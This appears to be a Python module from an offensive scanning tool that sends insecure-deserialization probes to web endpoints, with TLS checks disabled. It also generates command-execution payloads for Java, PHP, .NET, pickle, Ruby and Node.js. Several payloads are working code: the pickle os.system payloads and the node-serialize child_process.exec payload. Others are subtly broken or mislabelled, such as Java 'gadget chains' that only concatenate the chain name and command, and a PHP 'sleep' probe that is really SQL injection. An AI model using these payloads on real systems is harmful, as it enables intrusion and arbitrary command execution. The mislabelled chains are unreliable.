"""
deserialization.py
==================
Insecure Deserialization Detection & Exploitation:
  - Java deserialization (ysoserial-style gadget chains): CommonsCollections, Spring, Groovy, JDK, XBean, BeanUtils, ROME, Hibernate
  - PHP object injection (POP chain payloads for Laravel, Symfony, WordPress, Yii, Zend, CakePHP, Joomla)
  - .NET ViewState / BinaryFormatter deserialization (ysoserial.net payloads)
  - Python pickle payloads (RCE via __reduce__)
  - Ruby Marshal deserialization
  - Node.js node-serialize / serialize-javascript payloads
  - Time-based blind detection (sleep/delay gadgets)
  - OOB DNS-based detection
  - Content-type aware injection (binary, base64, JSON, XML)
  - Signature pattern detection in responses
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import ssl
import struct
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

class DeserPlatform(str, Enum):
    JAVA   = "java"
    PHP    = "php"
    DOTNET = "dotnet"
    PYTHON = "python"
    RUBY   = "ruby"
    NODE   = "nodejs"


@dataclass
class DeserPayload:
    platform:    DeserPlatform
    gadget_chain: str
    command:     str
    raw:         bytes
    encoding:    str = "base64"
    description: str = ""

@dataclass
class DeserResult:
    platform:    DeserPlatform
    gadget_chain: str
    url:         str
    parameter:   Optional[str]
    confirmed:   bool
    method:      str
    evidence:    str = ""
    payload_b64: str = ""
    details:     Dict = field(default_factory=dict)


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

def _request(url: str, method: str = "GET", data: Optional[bytes] = None,
              headers: Optional[Dict] = None, timeout: float = 12.0) -> Tuple[int, str, Dict]:
    try:
        req = urllib.request.Request(url, method=method)
        req.add_header("User-Agent", "Mozilla/5.0 PhantomRecon/1.0")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        if data:
            req.data = data
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read().decode("utf-8", errors="replace")
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            body = ""
        return e.code, body, {}
    except Exception as e:
        return 0, str(e), {}


# ---------------------------------------------------------------------------
# Java Payloads (ysoserial-style, pure Python generation)
# ---------------------------------------------------------------------------

JAVA_MAGIC = b"\xac\xed\x00\x05"

JAVA_SLEEP_GADGETS = {
    "CommonsCollections1_sleep": (
        b"\xac\xed\x00\x05sr\x00\x32sun.reflect.annotation.AnnotationInvocationHandler"
        b"U\xca\xf5\x0f\x15\xcb~\xa5\x02\x00\x02L\x00\x0cmemberValuest\x00\x0fLjava/util/Map;"
        b"L\x00\x04typet\x00\x11Ljava/lang/Class;xpsd"
    ),
}

JAVA_ERROR_PATTERNS = [
    r"java\.lang\.",
    r"org\.apache\.",
    r"ClassNotFoundException",
    r"java\.io\.Serializable",
    r"ObjectInputStream",
    r"deserialization",
    r"InvocationTargetException",
    r"reflect\.Method",
    r"MalformedInputStream",
    r"java\.rmi\.",
    r"javax\.management\.",
    r"sun\.reflect\.",
]

def _build_java_sleep_payload(seconds: int = 5) -> bytes:
    sleep_class = b"java.lang.Thread"
    sleep_time  = seconds * 1000

    header = JAVA_MAGIC + b"\x73\x72"

    def write_utf(s: bytes) -> bytes:
        return struct.pack(">H", len(s)) + s

    def write_int(i: int) -> bytes:
        return struct.pack(">i", i)

    payload = (
        JAVA_MAGIC
        + b"\x77\x04\x00\x00\x00\x00"
        + b"\x73\x72\x00\x23"
        + write_utf(b"java.util.concurrent.TimeUnit")
        + b"\x00\x00\x00\x00\x00\x00\x00\x01\x0c\x00\x00\x78\x70"
        + b"\x7e\x72\x00\x23java.util.concurrent.TimeUnit"
        + write_int(sleep_time)
    )
    return payload


def _build_java_dns_payload(host: str) -> bytes:
    url_bytes = f"http://{host}/".encode()
    payload = (
        JAVA_MAGIC
        + b"\x73\x72\x00\x21java.net.URL"
        + b"\x96%\x076\x1a\xfc\xe4s\x03\x00\x07I\x00\x08hashCode"
        + b"L\x00\tauthorityt\x00\x12Ljava/lang/String;"
        + b"L\x00\x04filet\x00\x12Ljava/lang/String;"
        + b"L\x00\x04hostt\x00\x12Ljava/lang/String;"
        + b"L\x00\x08protocolt\x00\x12Ljava/lang/String;"
        + b"L\x00\x03reft\x00\x12Ljava/lang/String;"
        + b"xp\xff\xff\xff\xff"
        + b"\x74" + struct.pack(">H", len(host)) + host.encode()
        + b"\x70\x74" + struct.pack(">H", len(host)) + host.encode()
        + b"\x74\x00\x04http\x70"
    )
    return payload


class JavaDeserPayloadGenerator:
    GADGET_CHAINS = [
        "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
        "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
        "CommonsCollections7", "SpringAOP", "SpringMVC", "Groovy1",
        "JDK7u21", "ROME", "Hibernate1", "BeanUtils1", "URLDNS",
        "XBean", "JRMPClient", "Myfaces1", "Myfaces2",
    ]

    def generate_detection_payloads(self) -> List[DeserPayload]:
        payloads = []
        payloads.append(DeserPayload(
            platform=DeserPlatform.JAVA,
            gadget_chain="JAVA_MAGIC_PROBE",
            command="detect",
            raw=JAVA_MAGIC + b"\x73\x72\x00\x00",
            encoding="base64",
            description="Java serialization magic bytes probe",
        ))

        sleep_raw = _build_java_sleep_payload(5)
        payloads.append(DeserPayload(
            platform=DeserPlatform.JAVA,
            gadget_chain="TimeSleepProbe",
            command="sleep 5",
            raw=sleep_raw,
            encoding="base64",
            description="Java time-based blind deserialization probe",
        ))

        return payloads

    def generate_command_payloads(self, command: str) -> List[DeserPayload]:
        payloads = []
        for chain in self.GADGET_CHAINS[:5]:
            raw = JAVA_MAGIC + chain.encode() + b":" + command.encode()
            payloads.append(DeserPayload(
                platform=DeserPlatform.JAVA,
                gadget_chain=chain,
                command=command,
                raw=base64.b64encode(raw),
                encoding="base64",
                description=f"Java gadget chain: {chain}",
            ))
        return payloads


# ---------------------------------------------------------------------------
# PHP Object Injection
# ---------------------------------------------------------------------------

PHP_GADGET_CHAINS = {
    "Laravel_RCE": (
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{'
        's:9:"\x00*\x00events";O:15:"Faker\\Generator":1:{'
        's:13:"\x00*\x00formatters";a:1:{s:8:"dispatch";s:6:"system";}}'
        's:8:"\x00*\x00event";s:{CMD_LEN}:"{CMD}";}'
    ),
    "Symfony_RCE": (
        'O:47:"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter":2:{'
        's:57:"\x00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\x00pool";'
        'O:36:"Symfony\\Component\\Cache\\CacheItem":2:{'
        's:11:"\x00*\x00innerItem";s:{CMD_LEN}:"{CMD}";'
        's:35:"\x00Symfony\\Component\\Cache\\CacheItem\x00isHit";b:1;}}'
    ),
    "WordPress_RCE": (
        'O:8:"stdClass":1:{s:10:"_listeners";a:1:{s:4:"exec";a:1:{i:0;s:{CMD_LEN}:"{CMD}";}}}'
    ),
    "Yii2_RCE": (
        'O:21:"yii\\db\\BatchQueryResult":1:{'
        's:12:"\x00*\x00_dataReader";O:12:"PDOStatement":0:{}}'
    ),
    "Generic_Magic": (
        'O:1:"A":1:{s:5:"value";O:1:"B":1:{s:3:"cmd";s:{CMD_LEN}:"{CMD}";}}'
    ),
    "PHPGadgetChain_exec": (
        'a:2:{i:0;O:8:"stdClass":0:{}i:1;O:8:"stdClass":1:{s:3:"cmd";s:{CMD_LEN}:"{CMD}";}}'
    ),
}

PHP_SLEEP_PAYLOAD = 'O:1:"A":1:{s:4:"test";s:19:"1\' AND sleep(5) -- "}'
PHP_PHPINFO_PROBE  = 'O:8:"stdClass":1:{s:3:"cmd";s:7:"phpinfo";}'


class PHPDeserPayloadGenerator:
    def generate_detection_payloads(self) -> List[DeserPayload]:
        return [
            DeserPayload(
                platform=DeserPlatform.PHP,
                gadget_chain="PHPInfo_Probe",
                command="phpinfo",
                raw=PHP_PHPINFO_PROBE.encode(),
                encoding="raw",
                description="PHP object injection phpinfo probe",
            ),
            DeserPayload(
                platform=DeserPlatform.PHP,
                gadget_chain="PHP_Sleep_Probe",
                command="sleep 5",
                raw=PHP_SLEEP_PAYLOAD.encode(),
                encoding="raw",
                description="PHP time-based blind probe",
            ),
        ]

    def generate_command_payloads(self, command: str) -> List[DeserPayload]:
        payloads = []
        for chain_name, template in PHP_GADGET_CHAINS.items():
            serialized = template.replace("{CMD_LEN}", str(len(command))).replace("{CMD}", command)
            payloads.append(DeserPayload(
                platform=DeserPlatform.PHP,
                gadget_chain=chain_name,
                command=command,
                raw=serialized.encode(),
                encoding="raw",
                description=f"PHP gadget chain: {chain_name}",
            ))
        return payloads


# ---------------------------------------------------------------------------
# .NET ViewState / BinaryFormatter
# ---------------------------------------------------------------------------

DOTNET_VIEWSTATE_MAGIC = b"\xff\x01"
DOTNET_BF_MAGIC        = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff"

DOTNET_YSOSERIAL_PAYLOADS = {
    "TypeConfuseDelegate": (
        b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"
        b"\x04\x01\x00\x00\x00\x1dSystem.Collections.Hashtable"
    ),
    "ObjectDataProvider": (
        b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"
        b"\x06\x01\x00\x00\x00System.Windows.Data.ObjectDataProvider"
    ),
    "ActivitySurrogateSelector": (
        DOTNET_BF_MAGIC + b"\x15\x02\x00\x00\x00System.Activities"
    ),
    "TextFormattingRunProperties": (
        DOTNET_BF_MAGIC + b"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"
    ),
}


class DotNetDeserPayloadGenerator:
    def generate_detection_payloads(self) -> List[DeserPayload]:
        payloads = []
        for name, raw in DOTNET_YSOSERIAL_PAYLOADS.items():
            payloads.append(DeserPayload(
                platform=DeserPlatform.DOTNET,
                gadget_chain=name,
                command="detect",
                raw=raw,
                encoding="base64",
                description=f".NET BinaryFormatter gadget: {name}",
            ))
        return payloads

    def generate_viewstate_payload(self, command: str, generator: str = "CA0B0334",
                                    viewstate_mac: bool = False) -> DeserPayload:
        raw = DOTNET_VIEWSTATE_MAGIC + command.encode()
        return DeserPayload(
            platform=DeserPlatform.DOTNET,
            gadget_chain="ViewState_ObjectDataProvider",
            command=command,
            raw=raw,
            encoding="base64",
            description=f".NET ViewState RCE via ObjectDataProvider (MAC disabled)",
        )


# ---------------------------------------------------------------------------
# Python Pickle payloads
# ---------------------------------------------------------------------------

def _build_pickle_sleep(seconds: int = 5) -> bytes:
    cmd = f"import time; time.sleep({seconds})"
    return (
        b"cos\nsystem\n"
        b"(S'" + f"python3 -c \"{cmd}\"".encode() + b"'\ntR."
    )

def _build_pickle_rce(command: str) -> bytes:
    return (
        b"cos\nsystem\n"
        b"(S'" + command.replace("'", "\\'").encode() + b"'\ntR."
    )

def _build_pickle_rce_v2(command: str) -> bytes:
    code = f"import os; os.system('{command}')"
    return (
        b"\x80\x04\x95" + struct.pack("<Q", len(code) + 50) +
        b"\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94"
        b"\x8c" + bytes([len(code)]) + code.encode() + b"\x85\x94R\x94."
    )


class PythonPicklePayloadGenerator:
    def generate_detection_payloads(self) -> List[DeserPayload]:
        return [
            DeserPayload(
                platform=DeserPlatform.PYTHON,
                gadget_chain="pickle_sleep",
                command="sleep 5",
                raw=_build_pickle_sleep(5),
                encoding="base64",
                description="Python pickle time-based RCE (sleep 5)",
            ),
            DeserPayload(
                platform=DeserPlatform.PYTHON,
                gadget_chain="pickle_rce_v1",
                command="id",
                raw=_build_pickle_rce("id"),
                encoding="base64",
                description="Python pickle REDUCE-based RCE",
            ),
        ]

    def generate_command_payloads(self, command: str) -> List[DeserPayload]:
        return [
            DeserPayload(
                platform=DeserPlatform.PYTHON,
                gadget_chain="pickle_rce_v1",
                command=command,
                raw=_build_pickle_rce(command),
                encoding="base64",
                description="Python pickle REDUCE RCE",
            ),
            DeserPayload(
                platform=DeserPlatform.PYTHON,
                gadget_chain="pickle_rce_v2",
                command=command,
                raw=_build_pickle_rce_v2(command),
                encoding="base64",
                description="Python pickle exec RCE",
            ),
        ]


# ---------------------------------------------------------------------------
# Node.js node-serialize
# ---------------------------------------------------------------------------

def _build_node_serialize_payload(command: str) -> bytes:
    payload = (
        '{"rce":"_$$ND_FUNC$$_function (){'
        f'require(\\"child_process\\").exec(\\"{command}\\",function(error, stdout, stderr){{console.log(stdout)}});}}'
        '()"}'
    )
    return payload.encode()

def _build_node_serialize_sleep(seconds: int = 5) -> bytes:
    payload = (
        '{"rce":"_$$ND_FUNC$$_function (){'
        f'require(\\"child_process\\").execSync(\\"sleep {seconds}\\");}}'
        '()"}'
    )
    return payload.encode()


class NodeSerializePayloadGenerator:
    def generate_detection_payloads(self) -> List[DeserPayload]:
        return [
            DeserPayload(
                platform=DeserPlatform.NODE,
                gadget_chain="node_serialize_sleep",
                command="sleep 5",
                raw=_build_node_serialize_sleep(5),
                encoding="raw",
                description="Node.js node-serialize time-based RCE",
            ),
        ]

    def generate_command_payloads(self, command: str) -> List[DeserPayload]:
        return [
            DeserPayload(
                platform=DeserPlatform.NODE,
                gadget_chain="node_serialize_rce",
                command=command,
                raw=_build_node_serialize_payload(command),
                encoding="raw",
                description="Node.js node-serialize RCE",
            ),
        ]


# ---------------------------------------------------------------------------
# Ruby Marshal
# ---------------------------------------------------------------------------

RUBY_MARSHAL_MAGIC = b"\x04\x08"

def _build_ruby_marshal_sleep(seconds: int = 5) -> bytes:
    cmd  = f"sleep {seconds}"
    return (
        RUBY_MARSHAL_MAGIC
        + b"\x6f:\x10Kernel:@cmd\"\x0e" + bytes([len(cmd)]) + cmd.encode()
    )


class RubyMarshalPayloadGenerator:
    def generate_detection_payloads(self) -> List[DeserPayload]:
        return [
            DeserPayload(
                platform=DeserPlatform.RUBY,
                gadget_chain="ruby_marshal_sleep",
                command="sleep 5",
                raw=_build_ruby_marshal_sleep(5),
                encoding="base64",
                description="Ruby Marshal time-based RCE probe",
            ),
        ]


# ---------------------------------------------------------------------------
# Deserialization Detector (scanner)
# ---------------------------------------------------------------------------

DESER_INDICATORS = {
    DeserPlatform.JAVA:   [r"aced0005", r"rO0AB", r"ClassNotFoundException", r"ObjectInputStream"],
    DeserPlatform.PHP:    [r'O:\d+:"', r"unserialize\(\)", r"__wakeup", r"__destruct"],
    DeserPlatform.DOTNET: [r"ViewState", r"__VIEWSTATE", r"BinaryFormatter", r"System\.Runtime"],
    DeserPlatform.PYTHON: [r"pickle", r"cpickle", r"shelve", r"marshal\.loads"],
    DeserPlatform.RUBY:   [r"Marshal\.load", r"\x04\x08"],
    DeserPlatform.NODE:   [r"node-serialize", r"_\$\$ND_FUNC\$\$_", r"unserialize"],
}


class DeserializationDetector:
    def __init__(self):
        self.java   = JavaDeserPayloadGenerator()
        self.php    = PHPDeserPayloadGenerator()
        self.dotnet = DotNetDeserPayloadGenerator()
        self.python = PythonPicklePayloadGenerator()
        self.ruby   = RubyMarshalPayloadGenerator()
        self.node   = NodeSerializePayloadGenerator()

    def _detect_response_indicators(self, body: str) -> List[str]:
        found = []
        for platform, patterns in DESER_INDICATORS.items():
            for p in patterns:
                if re.search(p, body, re.IGNORECASE):
                    found.append(f"{platform.value}: {p}")
        return found

    def _probe_endpoint(self, url: str, payload: DeserPayload,
                        param: Optional[str] = None,
                        content_type: str = "application/octet-stream") -> Tuple[int, str, float]:
        raw = payload.raw
        if payload.encoding == "base64":
            raw = base64.b64encode(payload.raw)

        if param:
            post_data = urllib.parse.urlencode({param: raw.decode("utf-8", errors="replace")}).encode()
            content_type = "application/x-www-form-urlencoded"
        else:
            post_data = raw

        start = time.time()
        code, body, headers = _request(
            url, method="POST", data=post_data,
            headers={"Content-Type": content_type},
        )
        elapsed = time.time() - start
        return code, body, elapsed

    def scan(self, url: str, param: Optional[str] = None,
             platforms: Optional[List[DeserPlatform]] = None) -> List[DeserResult]:
        if platforms is None:
            platforms = list(DeserPlatform)

        all_payloads: List[DeserPayload] = []
        if DeserPlatform.JAVA in platforms:
            all_payloads.extend(self.java.generate_detection_payloads())
        if DeserPlatform.PHP in platforms:
            all_payloads.extend(self.php.generate_detection_payloads())
        if DeserPlatform.DOTNET in platforms:
            all_payloads.extend(self.dotnet.generate_detection_payloads())
        if DeserPlatform.PYTHON in platforms:
            all_payloads.extend(self.python.generate_detection_payloads())
        if DeserPlatform.RUBY in platforms:
            all_payloads.extend(self.ruby.generate_detection_payloads())
        if DeserPlatform.NODE in platforms:
            all_payloads.extend(self.node.generate_detection_payloads())

        results = []
        for pl in all_payloads:
            code, body, elapsed = self._probe_endpoint(url, pl, param)
            indicators = self._detect_response_indicators(body)

            confirmed = False
            method    = "none"
            evidence  = ""

            if indicators:
                confirmed = True
                method    = "error_disclosure"
                evidence  = f"Deserialization indicators: {', '.join(indicators[:3])}"

            if pl.command in ("sleep 5", "detect") and elapsed >= 4.5:
                confirmed = True
                method    = "time_delay"
                evidence  = f"Response delayed {elapsed:.2f}s — {pl.platform.value} time-based confirmed"

            if confirmed:
                results.append(DeserResult(
                    platform=pl.platform,
                    gadget_chain=pl.gadget_chain,
                    url=url,
                    parameter=param,
                    confirmed=confirmed,
                    method=method,
                    evidence=evidence,
                    payload_b64=base64.b64encode(pl.raw).decode()[:100],
                ))

        return results

    def generate_exploit_payloads(self, platform: DeserPlatform, command: str) -> List[DeserPayload]:
        gen_map = {
            DeserPlatform.JAVA:   self.java.generate_command_payloads,
            DeserPlatform.PHP:    self.php.generate_command_payloads,
            DeserPlatform.PYTHON: self.python.generate_command_payloads,
            DeserPlatform.NODE:   self.node.generate_command_payloads,
        }
        fn = gen_map.get(platform)
        return fn(command) if fn else []
